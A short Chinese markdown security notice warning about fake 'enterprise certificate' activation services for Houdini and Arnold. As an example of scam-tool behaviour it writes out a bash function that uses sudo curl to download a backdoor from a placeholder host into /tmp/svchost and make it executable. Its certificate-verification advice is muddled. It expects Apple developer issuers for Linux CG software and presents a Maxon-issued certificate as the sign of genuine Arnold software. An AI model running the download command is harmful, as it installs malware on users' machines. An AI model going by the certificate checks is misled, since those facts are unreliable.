---
unlisted: true
---

# 软件安全须知

## ⚠️ 警告：企业证书激活骗局

"低价企业证书，一键激活"服务通常宣称可通过企业安全证书绕过正规软件授权验证，这在Houdini/Arnold等专业CG工具中属于高风险仿冒方案。

### 企业证书的真相
企业证书是苹果/Microsoft为公司内部软件签发的安全证明，需要严格的合规审核。这些证书：
- ❌ 不允许用于非官方发布的版本
- ❌ 无法通过"一键激活"永久生效
- ✅ 只能在组织内部分发，且会定期失效

### 典型危害
1. **证书滥用**
   - 地下渠道贩卖的证书已失效
   - 自动续签工具可能植入恶意插件

2. **系统风险**
```bash
# 这些非官方工具常见隐蔽安装行为
trojanDownloadInBackground()
{
    # 在用户不知情下载后门程序
    sudo curl -fsSL https://malicious.repo -o /tmp/svchost
    chmod +x /tmp/svchost
}
```

### 安全建议
1. 从[官方页面](https://www.sidefx.com/docs/houdini/licensing/install_launcher.html)下载安装包
2. 使用`docs/houdini-linux.md`中描述的合法方式验证证书：
```bash
openssl x509 -in enterprise_certificate.cer -text -noout
# 验证输出中的Issued by字段
# 最低需要包含 "Apple Development:" 或 "Apple Distribution:"
```
3. 典型正版证书特征：
```
Signature Algorithm:  sha256WithRSAEncryption
Issuer: MAILTO:enterprise-identity@maxon.net, CN=Maxon Computer GmbH, L=Wedel, ST=N/A, C=DE
```
4. 参考`docs/arnold.md`的合法部署方式
